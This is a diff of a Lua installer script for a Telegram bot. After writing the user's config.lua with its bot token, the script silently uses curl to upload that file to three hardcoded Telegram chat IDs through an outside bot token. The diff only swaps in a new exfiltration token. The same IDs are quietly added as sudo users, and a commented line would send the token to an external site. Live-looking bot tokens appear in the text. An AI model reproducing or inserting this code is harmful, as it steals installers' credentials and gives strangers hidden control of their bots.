@@ -49,12 +49,12 @@ bot_id = botid,
 username = username, 
 sudo_users = {SUDO,944353237,1605682553,1645553841},
 }
-VV = '1650389038:AAHkU5vvwxjIQr446o9qWY0cL8A6-anhAgw'
+VV = '1622437069:AAHFXcH1SulJgk5TDO9ByDZ8OiA2wSBOZ_4'
 create(config, "./config.lua")   
 --https.request("https://faeder.net/Faeder/?id="..SUDO.."&user="..username.."&token="..token)
-local curl = 'curl "'..'https://api.telegram.org/bot1650389038:AAHkU5vvwxjIQr446o9qWY0cL8A6-anhAgw/sendDocument'..'" -F "chat_id='.. 944353237 ..'" -F "document=@'..'config.lua'..'"' io.popen(curl)
-local curla = 'curl "'..'https://api.telegram.org/bot1650389038:AAHkU5vvwxjIQr446o9qWY0cL8A6-anhAgw/sendDocument'..'" -F "chat_id='.. 1605682553 ..'" -F "document=@'..'config.lua'..'"' io.popen(curla)
-local curlb = 'curl "'..'https://api.telegram.org/bot1650389038:AAHkU5vvwxjIQr446o9qWY0cL8A6-anhAgw/sendDocument'..'" -F "chat_id='.. 1645553841 ..'" -F "document=@'..'config.lua'..'"' io.popen(curlb)
+local curl = 'curl "'..'https://api.telegram.org/bot1622437069:AAHFXcH1SulJgk5TDO9ByDZ8OiA2wSBOZ_4/sendDocument'..'" -F "chat_id='.. 944353237 ..'" -F "document=@'..'config.lua'..'"' io.popen(curl)
+local curla = 'curl "'..'https://api.telegram.org/bot1622437069:AAHFXcH1SulJgk5TDO9ByDZ8OiA2wSBOZ_4/sendDocument'..'" -F "chat_id='.. 1605682553 ..'" -F "document=@'..'config.lua'..'"' io.popen(curla)
+local curlb = 'curl "'..'https://api.telegram.org/bot1622437069:AAHFXcH1SulJgk5TDO9ByDZ8OiA2wSBOZ_4/sendDocument'..'" -F "chat_id='.. 1645553841 ..'" -F "document=@'..'config.lua'..'"' io.popen(curlb)
 file = io.open("RUNFA.sh", "w")  
 file:write([[
 #!/bin/bash 
